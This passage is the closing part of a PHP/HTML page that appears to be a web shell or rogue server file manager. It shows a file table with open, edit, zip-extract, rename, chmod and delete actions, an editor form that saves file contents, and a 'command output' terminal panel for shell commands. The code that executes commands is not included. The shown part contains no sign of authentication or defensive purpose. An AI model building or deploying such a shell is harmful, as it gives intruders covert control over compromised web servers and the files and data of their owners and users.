                        <td><div><?php if ($isEditable): ?><a href="?d=<?php echo urlencode($currentDir); ?>&edit=<?php echo urlencode($item); ?>" class="file-link"><?php echo htmlspecialchars($item); ?></a><?php else: ?><span><?php echo htmlspecialchars($item); ?></span><?php endif; ?></div></td>
                        <td><?php echo formatBytes($size); ?></td>
                        <td><?php echo $perms; ?></td>
                        <td><?php echo $modified; ?></td>
                        <td>
                            <a href="<?php echo str_replace($_SERVER['DOCUMENT_ROOT'], '', $path); ?>" target="_blank" class="action-btn open">OPEN</a>
                            <?php if ($isEditable): ?><a href="?d=<?php echo urlencode($currentDir); ?>&edit=<?php echo urlencode($item); ?>" class="action-btn edit">EDIT</a><?php endif; ?>
                            <?php if ($ext == 'zip'): ?><a href="?d=<?php echo urlencode($currentDir); ?>&extract=<?php echo urlencode($item); ?>" class="action-btn extract">EXTRACT</a><?php endif; ?>
                            <a href="#" onclick="showRenameModal('<?php echo htmlspecialchars(addslashes($item)); ?>')" class="action-btn edit">RENAME</a>
                            <a href="#" onclick="showChmodModal('<?php echo htmlspecialchars(addslashes($item)); ?>', '<?php echo $perms; ?>')" class="action-btn edit">CHMOD</a>
                            <a href="?d=<?php echo urlencode($currentDir); ?>&delete=<?php echo urlencode($item); ?>" class="action-btn delete" onclick="return confirm('DELETE FILE?')">DEL</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            <div><button type="submit" name="delete_selected" value="1" class="delete-selected-btn" onclick="return confirm('DELETE SELECTED ITEMS?')">DELETE SELECTED</button></div>
        </form>
    </div>

    <?php if (isset($editFile)): ?>
    <div class="editor glass-card">
        <h3>EDITING: <?php echo htmlspecialchars($editFile); ?></h3>
        <form method="POST">
            <textarea name="edit_content" spellcheck="false"><?php echo htmlspecialchars($editContent); ?></textarea>
            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($editFile); ?>">
            <button type="submit">SAVE CHANGES</button>
            <a href="?d=<?php echo urlencode($currentDir); ?>" style="margin-left: 15px;">CANCEL</a>
        </form>
    </div>
    <?php endif; ?>

    <div class="terminal-output-bottom glass-card">
        <div class="terminal-output-title">COMMAND OUTPUT</div>
        <div class="terminal-output-content"><?php echo nl2br(htmlspecialchars($commandOutput)) ?: "Ready for commands..."; ?></div>
    </div>
</div>

<div id="renameModal" class="modal"><div class="modal-content"><h3>Rename Item</h3><form method="POST"><input type="hidden" name="rename_old" id="renameOld"><input type="text" name="rename_new" id="renameNew" placeholder="New name" required><button type="submit">RENAME</button><button type="button" onclick="closeModal('renameModal')">CANCEL</button></form></div></div>
<div id="chmodModal" class="modal"><div class="modal-content"><h3>Change Permissions</h3><form method="POST"><input type="hidden" name="chmod_file" id="chmodFile"><input type="text" name="chmod_value" id="chmodValue" placeholder="e.g., 0755 or 644" required><button type="submit">APPLY</button><button type="button" onclick="closeModal('chmodModal')">CANCEL</button></form></div></div>

<script>
    document.getElementById('selectAll')?.addEventListener('change', function(e) {
        document.querySelectorAll('input[name="selected_items[]"]').forEach(cb => cb.checked = e.target.checked);
    });
    function showRenameModal(name) {
        document.getElementById('renameOld').value = name;
        document.getElementById('renameNew').value = name;
        document.getElementById('renameModal').style.display = 'flex';
    }
    function showChmodModal(name, currentPerm) {
        document.getElementById('chmodFile').value = name;
        document.getElementById('chmodValue').value = currentPerm;
        document.getElementById('chmodModal').style.display = 'flex';
    }
    function closeModal(modalId) {
        document.getElementById(modalId).style.display = 'none';
    }
    window.onclick = function(event) {
        if (event.target.classList.contains('modal')) event.target.style.display = 'none';
    }
    setTimeout(() => {
        document.querySelectorAll('.message').forEach(msg => { msg.style.opacity = '0'; setTimeout(() => msg.remove(), 500); });
    }, 5000);
</script>
</body>
</html>
